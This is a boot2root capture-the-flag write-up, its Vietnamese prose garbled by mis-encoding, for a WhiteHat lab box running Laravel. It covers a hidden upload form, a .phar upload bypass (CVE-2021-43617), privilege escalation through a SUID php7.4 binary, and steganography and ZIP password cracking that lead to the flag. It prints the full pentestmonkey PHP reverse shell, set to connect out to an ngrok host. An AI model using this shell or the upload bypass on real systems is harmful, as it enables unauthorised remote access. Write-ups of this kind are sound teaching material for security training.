---
title: WRITEUP - WhiteHat Boot2root
subtitle: A boot2root box from WhiteHat
cover-img: 
thumbnail-img: /assets/img/Boot2root/wh-logo.png
tags: [Linux, Lavarel, PHP, SUID, Steganography]
readtime: true
---
# Phase 1: Reconnaissance (Khai thÃ¡c thÃ´ng tin)

Äáº§u tiÃªn táº¥t nhiÃªn ta sáº½ Ä‘i scan xem box Ä‘ang cháº¡y nhá»¯ng dá»‹ch vá»¥ nÃ o. VÃ¬ cÃ³ firewall nÃªn mÃ¬nh dÃ¹ng `-Pn -vv`

![Untitled](/assets/img/Boot2root/Untitled.png)

```bash
â”Œâ”€â”€(janlele91ã‰¿j4nl3le)-[~/Desktop/HackTheBox/Boot2root]
â””â”€$ nmap -Pn -vv 49.236.211.69 -o nmap.txt
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 22:59 +07
Initiating Parallel DNS resolution of 1 host. at 22:59
Completed Parallel DNS resolution of 1 host. at 22:59, 2.54s elapsed
Initiating Connect Scan at 22:59
Scanning 49.236.211.69 [1000 ports]
Discovered open port 22/tcp on 49.236.211.69
Discovered open port 8000/tcp on 49.236.211.69
Completed Connect Scan at 22:59, 15.95s elapsed (1000 total ports)
Nmap scan report for 49.236.211.69
Host is up, received user-set (0.025s latency).
Scanned at 2022-07-20 22:59:26 +07 for 16s
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.62 seconds
```

Káº¿t quáº£ cho tháº¥y cÃ³ 2 port lÃ  22 (SSH) vÃ  8000 (HTTP). CÃ³ váº» nhÆ° SSH cháº¯c khÃ´ng Ä‘Æ°á»£c Ä‘Ã¢u nÃªn mÃ¬nh thá»­ vá»›i port 8000 trÆ°á»›c. Truy cáº­p vÃ o trang thÃ¬ Ä‘Ã¢y lÃ  trang máº·c Ä‘á»‹nh cá»§a Lavarel, cÃ³ version 8.73.2 vá»›i PHP7.4.30. 

![Untitled](/assets/img/Boot2root/Untitled_1.png)

Viá»‡c tiáº¿p theo lÃ  tÃ¬m cÃ¡c directory hay file áº©n thui. MÃ¬nh dÃ¹ng dirsearch vá»›i cÃº phÃ¡p Ä‘Æ¡n giáº£n nhÆ° dÆ°á»›i.

![Untitled](/assets/img/Boot2root/Untitled_2.png)

Káº¿t quáº£ xuáº¥t hiá»‡n 2 file robots.txt vÃ  web.config, tuy nhiÃªn khÃ´ng cÃ³ thÃ´ng tin gÃ¬ Ä‘á»ƒ khai thÃ¡c. Truy cáº­p vÃ o Ä‘Æ°á»ng dáº«n `/upload` 

![Untitled](/assets/img/Boot2root/Untitled_3.png)

ÄÃ¢y cÃ³ láº½ lÃ  trang cho chÃºng ta upload file lÃªn. Tuy nhiÃªn trang web hiá»‡n `Nothing here` , nghe mÃ¹i bá»‹ lá»«a. Inspect trang ra thÃ¬ tháº¥y cÃ³ áº©n má»™t form upload.

![Untitled](/assets/img/Boot2root/Untitled_4.png)

Táº¯t thuá»™c tÃ­nh `visibility: hidden` Ä‘i vÃ  ta cÃ³ nÆ¡i Ä‘á»ƒ upload file.

# Phase 2: Foothold

Ta sáº½ upload thá»­ file `test.txt` cÃ³ ná»™i dung trÃªn xem.

![Untitled](/assets/img/Boot2root/Untitled_5.png)

Upload thÃ nh cÃ´ng vÃ  nÃ³ lÆ°u á»Ÿ Ä‘Æ°á»ng dáº«n `/images/1658333200.txt`

![Untitled](/assets/img/Boot2root/Untitled_6.png)

Xem file thÃ nh cÃ´ng.

![Untitled](/assets/img/Boot2root/Untitled_7.png)

Thá»­ vá»›i php thÃ¬ saoo?

![Untitled](/assets/img/Boot2root/Untitled_8.png)

Lá»—i tráº£ vá» cho biáº¿t trang web chá»‰ cho upload nhá»¯ng Ä‘á»‹nh dáº¡ng áº£nh.

![Untitled](/assets/img/Boot2root/Untitled_9.png)

MÃ¬nh upload thá»­ áº£nh bÃ¬nh thÆ°á»ng thÃ¬ xem Ä‘Æ°á»£c, tuy nhiÃªn khi upload Ä‘áº¿n áº£nh cÃ³ kÃ­ch thÆ°á»›c lá»›n thÃ¬ trang web tráº£ lá»—i.

![Untitled](/assets/img/Boot2root/Untitled_10.png)

CÃ³ váº» nhÆ° web khÃ´ng táº¯t cháº¿ Ä‘á»™ Debug, vÃ  cho chÃºng ta biáº¿t Ä‘Æ°á»£c lá»—i náº±m á»Ÿ dÃ²ng code nÃ o. CÃ³ má»™t file `UploadController.php` cÃ³ ná»™i dung nhÆ° sau:

```php
public function imageUploadPost(Request $request)
	
{

// $request->validate([

// 'image' => 'required|image|mimes:jpeg,png,jpg,gif,svg,php|max:2048',

// ]);

$validate = new Validate;

$notallowextension = ['html','js'];

if(!$validate->tester($request->image,['sfdfsdfdsfs'])){

 

    if(in_array($request->image->getClientOriginalExtension(), $notallowextension)){

        return back()->with('fail','Upload fail, require image with extension jpeg,png,jpg,gif,svg.');

    }

}

else {return back()->with('fail','Upload fail, require image with extension jpeg,png,jpg,gif,svg.');}

$imageName = time().'.'.$request->image->getClientOriginalExtension();

$request->image->move(public_path('images'), $imageName);

/* Store $imageName name in DATABASE from HERE */

return back()

->with('success','You have successfully upload image.')

->with('image',$imageName)

;

}
```

ÄÃ¢y chÃ­nh lÃ  Ä‘oáº¡n xá»­ lÃ½ file ta upload. NÃ³ chá»‰ cáº¥m cÃ¡c file nhÆ° HTML, JS vÃ  máº·c Ä‘á»‹nh Lavarel á»Ÿ version 8.73.2 cÅ©ng cáº¥m luÃ´n upload cÃ¡c file php vá»›i cÃ¡c extension khÃ¡c nhau báº±ng hÃ m `shouldBlockPhpUpload`

![Untitled](/assets/img/Boot2root/Untitled_11.png)

BÃªn cáº¡nh Ä‘Ã³, mÃ¬nh cÃ³ tháº¥y cÃ¡c trÆ°á»ng há»£p mÃ  web tráº£ lá»—i, trong Ä‘Ã³ cÃ³ trÆ°á»ng há»£p khÃ´ng upload file.

![Untitled](/assets/img/Boot2root/Untitled_12.png)

MÃ¬nh thá»­ click vÃ o button Upload luÃ´n mÃ  khÃ´ng thÃªm file vÃ o, xuáº¥t hiá»‡n lá»—i sau Ä‘Ã¢y vÃ  chÃ­nh Ä‘oáº¡n code cá»§a hÃ m `shouldBlockPhpUpload`

![Untitled](/assets/img/Boot2root/Untitled_13.png)

Tuy nhiÃªn Ä‘iá»u Ä‘áº·c biá»‡t á»Ÿ Ä‘Ã¢y lÃ  nÃ³ khÃ´ng cáº¥m file cÃ³ Ä‘uÃ´i `.phar` (Báº¡n cÃ³ thá»ƒ Ä‘á»c file phar lÃ  gÃ¬ á»Ÿ [Ä‘Ã¢y](https://www.php.net/manual/en/phar.fileformat.phar.php).). CÃ³ váº» nhÆ° box cá»‘ tÃ¬nh xÃ³a Ä‘oáº¡n nÃ y vÃ¬ hÃ¬nh trÃªn cho tháº¥y Lavarel 8.73.2 Ä‘Ã£ fix lá»—i nÃ y. Äá»ƒ biáº¿t thÃªm lá»—i gÃ¬ thÃ¬ Ä‘Ã³ lÃ  CVE-2021-43617 (Link: [(1) PhÃ¢n tÃ­ch vÃ  hÆ°á»›ng dáº«n triá»ƒn khai CVE-2021-43617 (Pháº§n 1) WhiteHat.vn](https://whitehat.vn/threads/phan-tich-va-huong-dan-trien-khai-cve-2021-43617-phan-1.16286/)). Cá»¥ thá»ƒ, vá»›i cÃ¡c web Ä‘Æ°á»£c host bá»Ÿi cÃ¡c server sá»­ dá»¥ng nhÃ¢n Debian nhÆ° Ubuntu thÃ¬ khi upload file `.phar` lÃªn nÃ³ váº«n thá»±c thi Ä‘Æ°á»£c code PHP. 

![Untitled](/assets/img/Boot2root/Untitled_14.png)

Trong khi Ä‘Ã³ box cÅ©ng cháº¡y trÃªn Ubuntu â†’ Ta sáº½ upload file .phar cÃ³ chá»©a code PHP Ä‘á»ƒ reverse shell vá» mÃ¡y mÃ¬nh.

![Untitled](/assets/img/Boot2root/Untitled_15.png)

Test trÆ°á»›c vá»›i file `.phar` cÃ³ code `<?php echo "testttt"; ?>` 

![Untitled](/assets/img/Boot2root/Untitled_16.png)

ThÃ nh cÃ´nggg~. Má»¥c tiÃªu bÃ¢y giá» lÃ  public má»™t port mÃ¡y local cá»§a mÃ¬nh Ä‘á»ƒ láº¯ng nghe káº¿t ná»‘i reverse shell vá» mÃ¡y. MÃ¬nh sáº½ sá»­ dá»¥ng ngrok Ä‘á»ƒ public port 4567 ra ngoÃ i.

![Untitled](/assets/img/Boot2root/Untitled_17.png)

Khi Ä‘Ã³ ta cáº§n payload php káº¿t ná»‘i vá» domain [0.tcp.ap.ngrok.io](http://0.tcp.ap.ngrok.io) á»Ÿ port 11177. Sá»­ dá»¥ng payload sau cÃ³ nguá»“n tá»« [php-reverse-shell/php-reverse-shell.php at master Â· pentestmonkey/php-reverse-shell (github.com)](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Ta chá»‰nh IP vÃ  Port tÆ°Æ¡ng á»©ng. Äá»“ng thá»i lÆ°u thÃ nh file .phar Ä‘á»ƒ upload.

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '0.tcp.ap.ngrok.io';
$port = 11177;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Upload thÃ nh cÃ´ng vÃ  truy cáº­p Ä‘áº¿n Ä‘Æ°á»ng dáº«n cá»§a file. Táº¥t nhiÃªn mÃ¡y local sáº½ láº¯ng nghe á»Ÿ port 4567 trÆ°á»›c.

![Untitled](/assets/img/Boot2root/Untitled_18.png)

VÃ  ta Ä‘Ã£ cÃ³ shell. Giá» thÃ¬ leo thang thÃ´i.

# Phase 3: Privilege Escalation

Sau má»™t há»“i mÃ y mÃ², thÃ¬ mÃ¬nh tÃ¬m Ä‘Æ°á»£c manh má»‘i khi thá»­ liá»‡t kÃª cÃ¡c file cÃ³ SUID. Cá»¥ thá»ƒ, cÃ³ má»™t file `/usr/bin/php7.4` Ä‘Ã¡ng kháº£ nghi vÃ¬ thÆ°á»ng php Ä‘Æ°á»£c cÃ i Ä‘áº·t sáº½ cÃ³ Ä‘Æ°á»ng dáº«n lÃ  `/usr/bin/php`.

![Untitled](/assets/img/Boot2root/Untitled_19.png)

MÃ¬nh cháº¡y thá»­ vá»›i cÃ¢u lá»‡nh nhÆ° hÃ¬nh trÃªn, vÃ  cÃ³ váº» nhÆ° cÃ¡ch hoáº¡t Ä‘á»™ng cá»§a nÃ³ y chang php bÃ¬nh thÆ°á»ng. MÃ¬nh check ra thÃ¬ biáº¿t nÃ³ cÅ©ng lÃ  cá»§a `root`.

![Untitled](/assets/img/Boot2root/Untitled_20.png)

Khi Ä‘Ã³ mÃ¬nh chá»‰ cáº§n thá»±c hiá»‡n lá»‡nh sau, dá»±a vÃ o document cá»§a GTFOBins. Cá»¥ thá»ƒ, tá»« file binary `/usr/bin/php7.4` nÃ y ta thá»±c thi lá»‡nh `/bin/bash -p` vÃ¬ option `-p` cho ta thá»±c thi file dÆ°á»›i quyá»n owner, á»Ÿ Ä‘Ã¢y chÃ­nh lÃ  `root`

![Untitled](/assets/img/Boot2root/Untitled_21.png)

Thá»±c thi vÃ  ta Ä‘Ã£ leo thang thÃ nh cÃ´ng vÃ  chiáº¿m Ä‘Æ°á»£c quyá»n root. Kiáº¿m Ä‘Æ°á»£c file `root.txt`.

![Untitled](/assets/img/Boot2root/Untitled_22.png)

Tuy nhiÃªn Ä‘Ã¢y lÃ  file áº£nh JPEG dá»±a vÃ o header chunk `JFIF`. BÃ¢y giá» ta cáº§n xem áº£nh, á»Ÿ Ä‘Ã¢y mÃ¬nh dÃ¹ng cÃ¡ch Ä‘Æ°a nÃ³ lÃªn Ä‘Æ°á»ng dáº«n `/images` cá»§a web vÃ  set full quyá»n Ä‘á»ƒ cÃ³ thá»ƒ truy cáº­p báº±ng 2 cÃ¢u lá»‡nh sau

```php
cp root/root.txt /var/www/html/43617/public/images/
chmod 777 /var/www/html/43617/public/images/root.txt
```

Truy cáº­p web á»Ÿ port 8000 vá»›i Ä‘Æ°á»ng dáº«n `/images/root.txt`

![Untitled](/assets/img/Boot2root/Untitled_23.png)

Download áº£nh vá» báº±ng wget vÃ  táº¥t nhiÃªn xÃ³a nÃ³ Ä‘i Ä‘á»ƒ trÃ¡nh phÃ¡ box ğŸ˜€

![Untitled](/assets/img/Boot2root/Untitled_24.png)

Äá»•i thÃ nh Ä‘uÃ´i jpeg vÃ  má»Ÿ áº£nh lÃªn vÃ  chÆ°a cÃ³ flag :< 

![Untitled](/assets/img/Boot2root/Untitled_25.png)

Äáº¿n Ä‘Ã¢y mÃ¬nh cÃ³ láº½ cáº§n dÃ¹ng Ä‘áº¿n cÃ¡c kÄ© thuáº­t trong Steganography. MÃ¬nh dÃ¹ng `stegcracker` lÃ  má»™t tool bruteforce password Ä‘á»ƒ xem file áº©n bÃªn trong. á» Ä‘Ã¢y mÃ¬nh dÃ¹ng wordlist `rockyou.txt` vÃ  cÃ³ Ä‘Æ°á»£c káº¿t quáº£.

```bash
â”Œâ”€â”€(janlele91ã‰¿j4nl3le)-[~/Desktop/HackTheBox/Boot2root]
â””â”€$ stegcracker root.jpeg rockyou.txt 
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'root.jpeg' with wordlist 'rockyou.txt'..
Successfully cracked file with password: freedom
Tried 896 passwords
Your file has been written to: root.jpeg.out
freedom
```

Máº­t kháº©u lÃ  `freedom` vÃ  tool cÅ©ng tá»± output cho mÃ¬nh thÆ° má»¥c chá»©a file áº©n trong Ä‘Ã³ luÃ´n. Truy cáº­p thÃ¬ phÃ¡t hiá»‡n cÃ³ file `flag.txt`.

![Untitled](/assets/img/Boot2root/Untitled_26.png)

Tuy nhiÃªn Ä‘Ã¢y lÃ  file ZIP vÃ  cÃ³ password. MÃ¬nh nghÄ© ngÃ y Ä‘áº¿n crack password file zip báº±ng `john the ripper`***.***

```bash
â”€â”€(janlele91ã‰¿j4nl3le)-[~/â€¦/HackTheBox/Boot2root/root (1).jpeg/data]
â””â”€$ zip2john flag.txt > flag_hash.txt
ver 1.0 efh 5455 efh 7875 flag.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=54, decmplen=42, crc=8C1844AE ts=5921 cs=5921 type=0
                                                                                                                                                                
â”Œâ”€â”€(janlele91ã‰¿j4nl3le)-[~/â€¦/HackTheBox/Boot2root/root (1).jpeg/data]
â””â”€$ cat flag_hash.txt                   
flag.zip/root.txt:$pkzip$1*2*2*0*36*2a*8c1844ae*0*42*0*36*5921*c53967f82039cd33b2148b8b23af3dfcc23bd6c63a0a0e0d155a56be9d750c3fd4a84b868030f9d3de899ff6c6e18e317fba8f6a7b68*$/pkzip$:root.txt:flag.zip::flag.zip

â”Œâ”€â”€(janlele91ã‰¿j4nl3le)-[~/â€¦/HackTheBox/Boot2root/root (1).jpeg/data]
â””â”€$ john --wordlist=../../rockyou.txt flag_hash.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
friend           (flag.txt/root.txt)     
1g 0:00:00:00 DONE (2022-07-20 22:43) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..total90
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![Untitled](/assets/img/Boot2root/Untitled_27.png)

Thá»­ vá»›i wordlist `rockyou.txt` vÃ  ta Ä‘Ã£ cÃ³ password lÃ  `friend`

![Untitled](/assets/img/Boot2root/Untitled_28.png)

Giáº£i nÃ©n file `flag.txt` ra vÃ  ta cÃ³ file `root.txt` cáº§n tÃ¬m vá»›i flag.


> ğŸ’¡ FLAG: **Lab2{*c0ngr4tul4t0n_y0u_4r3_1s_th3_b3st*}**


Owned by *Janlele91* ğŸ˜ğŸ˜